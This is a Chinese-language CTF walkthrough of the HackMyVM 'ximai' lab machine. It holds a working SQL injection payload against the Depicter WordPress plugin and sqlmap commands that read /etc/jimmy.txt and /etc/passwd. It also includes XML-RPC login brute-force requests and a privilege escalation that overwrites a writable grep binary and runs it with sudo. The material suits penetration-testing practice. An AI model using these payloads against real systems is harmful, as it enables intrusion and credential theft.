# Hackmyvm ximai靶机


`port=$(nmap -T4 --min-rate=1000 -p- 192.168.250.66 | awk '/^[0-9]/ {print $1}' | cut -d'/' -f1 | paste -sd,) && nmap -sV -p $port $ip`

>Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 10:04 EDT
Nmap scan report for 192.168.250.66
Host is up (0.00061s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
25/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
110/tcp  open  tcpwrapped
3306/tcp open  mysql      MariaDB 10.3.23 or earlier (unauthorized)
8000/tcp open  http       Apache httpd 2.4.62 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds

先看两个http端口，80端口没东西扫描一下目录
有一个reminder.php页面有提示


username字段有mysql报错，但是用sqlmap没有爆出东西。文本提示有一个txt文件，目录源码中图片暴露了扫描路径that-place-where-i-put-that-thing-that-time

使用gobuster扫描出来一个creds.txt
>┌──(root㉿kali)-[~]
└─# curl http://192.168.250.66/that-place-where-i-put-that-thing-that-time/creds.txt
total 8.0K
drwxr-xr-x 2 root root 4.0K May 17 18:43 .
drwxr-xr-x 3 root root 4.0K May 17 18:43 ..
>lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -> /etc/jimmy.txt

然后没有信息了，再看看8000端口，是个wp博客
有提示wp插件和sql注入，可能是注入后利用mysqli.allow_local_infile = On任意文件读取
wpscan扫一下信息，发现有个xmlrpc.php可以利用，搜一下怎么利用

查看系统允许的方法
>POST /xmlrpc.php HTTP/1.1
Host: 192.168.250.66:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
>Content-Length: 91

><methodCall>
<methodName>system.listMethods</methodName>
<params></params>
></methodCall>


爆破账户
>POST /xmlrpc.php HTTP/1.1
Host: 192.168.250.66:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
>Content-Length: 167


><methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>admin</value></param>
</params>
></methodCall>
直接用burpsuite爆破，爆破有点慢，先看其他漏洞
>[+] depicter
 | Location: http://192.168.250.66:8000/wp-content/plugins/depicter/
 | Last Updated: 2025-06-17T08:26:00.000Z
 | Readme: http://192.168.250.66:8000/wp-content/plugins/depicter/readme.txt
 | [!] The version is out of date, the latest version is 4.0.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.250.66:8000/wp-content/plugins/depicter/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Slider & Popup Builder by Depicter < 3.6.2 - Unauthenticated SQLi via 's' Parameter
 |     Fixed in: 3.6.2
 |     References:
 |      - https://wpscan.com/vulnerability/6f894272-3eb6-4595-ae00-1c4b0c0b6564
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2011
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/49b36cde-39d8-4a69-8d7c-7b850b76a7cd
 |
 | Version: 3.6.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 >|  - http://192.168.250.66:8000/wp-content/plugins/depicter/readme.txt


有cve，跑一下poc，我去没成功。
`http://192.168.250.66:8000/wp-admin/admin-ajax.php?s=test%' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))='&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index`

注入点在test后面，用sqlmap跑一下
`sqlmap -u "http://192.168.250.66:8000/wp-admin/admin-ajax.php?s=test%25*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index" `
wordpress库中wp_users表有一个用户adminer，密码加密，是bcrypt加密，爆破一下，，但是试了很多字典都不行， 还有一个库zabbix，但是没东西，先再往下看
文件读取
--file-read="/etc/jimmy.txt"

>┌──(root㉿kali)-[~/…/output/192.168.250.66/dump/wordpress]
└─# cat /root/.local/share/sqlmap/output/192.168.250.66/files/_etc_jimmy.txt
>HandsomeHU
有可能是adminer的密码，试了一下不对，之前80端口还有个adminer.php试一下，也不行，那是什么凭证呢，难道是ssh吗
先用sqlmap把/etc/passwd扒拉下来看看有几个用户可以登录
试一下  jimmy/HandsomeHUz

登录进来很多命令都用不了
sorry, you are restricted from using this command.
但是cd到别的目录之后再ls发现会报错./.../ls
可能是环境变量被改了，那只能用绝对路径搞了，/bin/ls，当前目录有user.txt文件，后面-a发现有个bashrc，里面把那一行export PATH=\"./...\删掉，重新登陆就行了
后面扒拉不到什么，上传linpeas，跑不了，看wp，给grep改了，当时不知道，就继续扒拉。然后没头绪了，看wp，还是字典问题，adminer/adminer123456
最后的提权比较简单
grep可写
`echo bash > /usr/bin/grep`
`sudo /usr/bin/grep`